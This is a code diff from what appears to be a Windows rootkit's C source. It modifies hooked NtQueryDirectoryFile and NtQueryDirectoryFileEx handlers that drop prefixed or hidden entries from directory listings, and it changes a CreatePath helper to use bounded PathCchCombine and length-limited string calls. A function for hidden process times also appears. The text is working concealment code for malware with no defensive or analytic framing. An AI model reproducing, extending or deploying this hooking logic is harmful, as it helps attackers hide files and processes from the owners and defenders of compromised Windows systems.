@@ -8,6 +8,7 @@
 #include "detours.h"
 #include <Shlwapi.h>
 #include <wchar.h>
+#include <PathCch.h>
 
 static NT_NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
 static NT_NTRESUMETHREAD OriginalNtResumeThread;
@@ -306,7 +307,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		if (returnSingleEntry)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
-			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
+			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)))
 			{
 				status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
 				if (status) break;
@@ -322,7 +323,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 			{
 				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName), MAX_PATH)))
 				{
 					if (nextEntryOffset)
 					{
@@ -368,7 +369,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
-			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName))))
+			for (BOOL skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)); skip; skip = HasPrefix(FileInformationGetName(fileInformation, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(fileInformation, fileInformationClass, fileFileName), MAX_PATH)))
 			{
 				status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);
 				if (status) break;
@@ -384,7 +385,7 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 			{
 				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);
 
-				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName))))
+				if (HasPrefix(FileInformationGetName(current, fileInformationClass, fileFileName)) || IsPathHidden(CreatePath(fileFullPath, fileDirectoryPath, FileInformationGetName(current, fileInformationClass, fileFileName), MAX_PATH)))
 				{
 					if (nextEntryOffset)
 					{
@@ -962,18 +963,19 @@ static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGE
 	FREE(systemInformation);
 	return result;
 }
-static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
+static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName, DWORD resultLength)
 {
-	// PathCombineW cannot be used with the directory name "\\.\pipe\".
-	if (!StrCmpIW(directoryName, L"\\\\.\\pipe\\"))
+	// PathCchCombine cannot be used with the directory name "\\.\pipe\".
+	if (!StrCmpNIW(directoryName, L"\\\\.\\pipe\\", resultLength))
 	{
-		StrCpyW(result, directoryName);
-		StrCatW(result, fileName);
+		StrCpyNW(result, directoryName, resultLength);
+		StrNCatW(result, fileName, resultLength);
 		return result;
 	}
 	else
 	{
-		return PathCombineW(result, directoryName, fileName);
+		PathCchCombine(result, resultLength, directoryName, fileName);
+		return result;
 	}
 }
 static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name)
